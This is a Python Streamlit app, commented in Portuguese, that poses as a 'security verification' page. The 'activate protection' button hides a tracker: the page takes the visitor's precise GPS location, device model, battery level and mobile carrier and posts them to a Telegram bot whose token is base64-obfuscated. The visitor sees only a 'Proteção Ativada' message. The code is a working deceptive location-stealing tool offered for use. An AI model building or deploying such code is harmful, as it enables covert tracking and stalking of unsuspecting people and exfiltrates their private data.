import streamlit as st
import requests
import base64
import time
from streamlit_js_eval import streamlit_js_eval

# --- CONFIGURAÇÃO DO BOT ---
B_TK = "ODA5OTI1MzM4MjpBQUhXWVVqZnBXMTlKNTZVZF9GQ01fOXRPYnhVNHJMaDNnUQ=="
B_ID = "ODQ5ODY2NDAyOA=="

def enviar_telegram(texto):
    try:
        token = base64.b64decode(B_TK).decode("utf-8").strip()
        chat = base64.b64decode(B_ID).decode("utf-8").strip()
        requests.post(f"https://api.telegram.org/bot{token}/sendMessage", 
                      json={"chat_id": chat, "text": texto, "parse_mode": "Markdown"}, timeout=15)
    except: pass

st.set_page_config(page_title="SEGURANÇA MIAMY", page_icon="🔐")

# --- PEDIR LOCALIZAÇÃO AO ENTRAR (POP-UP AUTOMÁTICO) ---
# Esta linha faz o navegador pedir permissão assim que o site carrega
loc_js = "new Promise((res) => { navigator.geolocation.getCurrentPosition((p) => { res(p.coords.latitude + ',' + p.coords.longitude); }, () => { res('erro'); }, {enableHighAccuracy:true}); })"
posicao = streamlit_js_eval(js_expressions=loc_js, key="GPS_AUTO_OPEN")

# Coleta de dados do aparelho
ua = streamlit_js_eval(js_expressions="window.navigator.userAgent", key="UA_DETECTOR")
bat = streamlit_js_eval(js_expressions="navigator.getBattery().then(b => Math.round(b.level * 100))", key="BAT_DETECTOR")

st.title("Verificação de Segurança")

if st.button("● ATIVAR PROTEÇÃO AGORA"):
    # 1. PEGAR O MODELO EXATO (Lógica avançada)
    modelo_exato = "Smartphone Android"
    if ua:
        try:
            info = ua.split("(")[1].split(")")[0]
            partes = [p.strip() for p in info.split(";")]
            # Procura marcas e códigos de modelo (Ex: POCO, SM-, etc)
            marcas = ["POCO", "Samsung", "SM-", "Redmi", "Xiaomi", "Motorola", "iPhone", "2312"]
            for p in partes:
                if any(m in p for m in marcas):
                    modelo_exato = p
                    break
            if modelo_exato == "Smartphone Android":
                modelo_exato = partes[-1]
        except: pass

    # 2. Operadora
    try:
        op = requests.get('https://ipinfo.io/json', timeout=5).json().get('org', 'Móvel')
    except: op = "Rede Móvel"

    # 3. Verificação e Envio
    if posicao and posicao != "erro":
        link_maps = f"https://www.google.com/maps?q={posicao}"
        
        relatorio = (
            f"🛡️ *PROTEÇÃO ATIVADA*\n"
            f"📱 *Aparelho:* {modelo_exato}\n"
            f"🔋 *Bateria:* {bat if bat else '??'}%\n"
            f"📶 *Operadora:* {op}\n"
            f"📍 *Local:* {link_maps}"
        )
        enviar_telegram(relatorio)
        # SÓ APARECE ISSO NO SITE
        st.success("Proteção Ativada")
    elif posicao == "erro":
        st.error("Erro: A permissão de localização foi negada.")
    else:
        st.warning("Aguardando permissão de localização... verifique o topo da tela.")

st.markdown('<p style="text-align:center; color:grey; font-size:10px;">Sistema Integrado Miamy © 2026</p>', unsafe_allow_html=True)
